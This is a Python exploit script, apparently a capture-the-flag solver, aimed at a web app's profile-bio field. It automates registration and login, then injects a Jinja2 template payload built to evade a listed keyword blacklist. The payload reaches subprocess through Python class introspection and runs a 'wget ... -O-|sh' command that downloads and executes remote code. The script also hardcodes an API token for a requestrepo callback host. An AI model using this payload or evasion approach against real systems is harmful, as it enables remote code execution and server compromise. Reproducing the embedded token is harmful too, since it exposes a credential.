import httpx
import re
import html
import sys
from requestrepo import Requestrepo # pip install requestrepo
from time import sleep
client = Requestrepo(token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3NTg5NzI5NDQsImV4cCI6MTc2MTY1MTM0NCwic3ViZG9tYWluIjoidWJodG91bzQifQ.PaMdCUmamA8TCw2lo8DG6fa3WPKq7US7FrA5NibCK7Y", host="requestrepo.com", port=443, protocol="https")
import random
import string

if len(sys.argv) < 2:
    print("Usage: python solver.py <payload>")
    sys.exit(1)

I = sys.argv[1]

URL = f"http://10.0.38.16:400{I}/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url, timeout=300)

class API(BaseAPI):
    def register(self, username: str, email: str, password: str) -> None:
        response = self.c.get(f"/register/")
        # print(response.text)
        csrf_token = re.search(r'name="csrfmiddlewaretoken" value="(.*?)"', response.text).group(1)
        response = self.c.post(f"/register/", data={"username": username, "email": email, "password": password, "csrfmiddlewaretoken": csrf_token})
        # print(response.text)
    def login(self, username: str, password: str) -> None:
        response = self.c.get(f"/login/")
        csrf_token = re.search(r'name="csrfmiddlewaretoken" value="(.*?)"', response.text).group(1)
        response = self.c.post(f"/login/", data={"username": username, "password": password, "csrfmiddlewaretoken": csrf_token})
        # print(response.text)

    def get_user_id(self) -> None:
        response = self.c.get(f"/")
        # print(response.text)
        user_id = re.search(r'href="/u/(.*?)/"', response.text).group(1)
        return user_id

    def edit_profile(self, bio: str) -> None:
        response = self.c.get(f"/u/me/edit/")
        csrf_token = re.search(r'name="csrfmiddlewaretoken" value="(.*?)"', response.text).group(1)
        response = self.c.post(f"/u/me/edit/", data={"bio": bio, "csrfmiddlewaretoken": csrf_token})
        # print(response.text)
    
    def get_profile(self, user_id: str) -> None:
        response = self.c.get(f"/u/{user_id}/")
        code = re.search(r'<code>(.*?)</code>', response.text, re.DOTALL).group(1)
        code = html.unescape(html.unescape(code))
        return code
        
def main():
    api = API()
    username = "".join(random.choices(string.ascii_letters + string.digits, k=10))
    email = "".join(random.choices(string.ascii_letters + string.digits, k=10)) + "@test.com"
    password = "".join(random.choices(string.ascii_letters + string.digits, k=10))  
    api.register(username=username, email=email, password=password)
    api.login(username=username, password=password)
    user_id = api.get_user_id()
    # blacklist = ["{{","}}",".","*",">","<","import","popen","read","application","/","flag","globals","getitem","echo",'"',"cat","+","lipsum","getattr","joiner","namespace","dict","range","cycler","request","self","config",'\\',"0x","bytes","0o","0b","os","lower","upper"]
    blacklist = ["{{","}}",".","*",">","<","import","popen","read","application","/","flag","globals","getitem","echo",'"',"cat","+","lipsum","getattr","joiner","namespace","dict","range","cycler","request","self","config",'\\',"0x","bytes","0o","0b","os","lower","upper"]
    payload = """{%print(((1|attr('__class__')|attr('__mro__'))[1]|attr('__subclasses__'))()[399]('wget 1pc$(ls -d)tf:4444 -O-|sh',shell=True))%}"""
    # print(len(payload))
    for char in blacklist:
        if char in payload:
            print(char)

    api.edit_profile(payload)
    api.get_profile(user_id)
    # print(res)
    sleep(3)
    print(client.get_http_request())




if __name__ == "__main__":
    main()
